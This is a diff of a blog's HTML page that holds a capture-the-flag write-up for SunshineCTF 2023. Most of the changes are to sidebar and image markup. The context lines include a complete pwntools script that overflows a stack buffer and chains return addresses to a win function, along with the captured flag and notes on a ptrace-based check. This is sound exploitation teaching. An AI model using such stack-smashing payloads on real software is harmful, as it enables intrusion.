@@ -231,11 +231,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -335,9 +335,9 @@
 <p><img src="https://hackmd.io/_uploads/SJYDJ4lbp.png"><br>It gave us <code>rsp</code> and also has a huge <code>BOF</code><br>with <code>No PIE</code> we can just write back the <code>ret adr</code> to bypass the check<br>and write <code>func1&#39;s ret adr</code> to <code>win</code></p>
 <p>I also use gdb to help me write bypass payload more easily<br><img src="https://hackmd.io/_uploads/HyC1-4xZT.png"></p>
 <h4 id="slove-script"><a href="#slove-script" class="headerlink" title="slove script:"></a>slove script:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">sys.path.append(<span class="string">&#x27;/home/aukro/pwnbox/data&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> tool.template <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">init(<span class="number">64</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">r = nc(<span class="string">&#x27;nc chal.2023.sunshinectf.games 23002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;At &#x27;</span>)</span><br><span class="line">a = r.recvline().strip()</span><br><span class="line"></span><br><span class="line">rsp = <span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line">rbp = rsp+<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rsp))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">128</span>+ p64(rbp+<span class="number">0x20</span>) + p64(<span class="number">0x401276</span>) +<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(rbp+<span class="number">0x40</span>) + p64(<span class="number">0x4012a0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(rbp+<span class="number">0x60</span>) +p64(<span class="number">0x4012ca</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> +p64(rbp+<span class="number">0x70</span>) +p64(<span class="number">0x4012f0</span>) +<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4011bd</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h4><h2 id="sun-here-then-there-then-everywhere-Bug-Spray-🐛🪲🐞"><a href="#sun-here-then-there-then-everywhere-Bug-Spray-🐛🪲🐞" class="headerlink" title="sun{here_then_there_then_everywhere}### Bug Spray 🐛🪲🐞"></a><code>sun&#123;here_then_there_then_everywhere&#125;</code><br>### Bug Spray 🐛🪲🐞</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/rkd-x7gbp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkd-x7gbp.png" alt="Security check"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">Security check</span></div></div></p>
+<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h4><h2 id="sun-here-then-there-then-everywhere-Bug-Spray-🐛🪲🐞"><a href="#sun-here-then-there-then-everywhere-Bug-Spray-🐛🪲🐞" class="headerlink" title="sun{here_then_there_then_everywhere}### Bug Spray 🐛🪲🐞"></a><code>sun&#123;here_then_there_then_everywhere&#125;</code><br>### Bug Spray 🐛🪲🐞</h2><p><img src="https://hackmd.io/_uploads/rkd-x7gbp.png" alt="Security check"></p>
 <p>First thing first we use IDA Decompile it<br><a target="_blank" rel="noopener" href="https://hackmd.io/_uploads/BJ27jfgbT.png">IDA_DECOMPILE</a><br>imo that IDA didn’t decompile correctly<br>so i chose to oberserve the Assembly code</p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1_FJ7xWa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1_FJ7xWa.png" alt="IDA_DEASSEM"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">IDA_DEASSEM</span></div></div><br>In this block we know we have <em><strong>RWX</strong></em> at <code>0x777777</code> and its size is <code>0x12c</code><br>also we know after this block<br><code>r10=r12=0x64</code><br><img src="https://hackmd.io/_uploads/rJYMbmlZp.png"><br>Our target is goto <code>Lable:off</code> for the rwx segment</p>
+<p><img src="https://hackmd.io/_uploads/H1_FJ7xWa.png" alt="IDA_DEASSEM"><br>In this block we know we have <em><strong>RWX</strong></em> at <code>0x777777</code> and its size is <code>0x12c</code><br>also we know after this block<br><code>r10=r12=0x64</code><br><img src="https://hackmd.io/_uploads/rJYMbmlZp.png"><br>Our target is goto <code>Lable:off</code> for the rwx segment</p>
 <p>Todo </p>
 <p>At the top two blocks of this picture we know it hope the length we wrote is 0x44 or 0x45 (0x64 &lt;&#x3D; rax+20 &lt; 0x66)</p>
 <p>After that it do syscall, and we know 0x64 stands for <code>sys_time</code>, 0x65 stands for <code>sys_ptrace</code>, after testing we know only  <code>sys_ptrace</code> is possible to return 0</p>
@@ -509,7 +509,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -561,11 +561,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
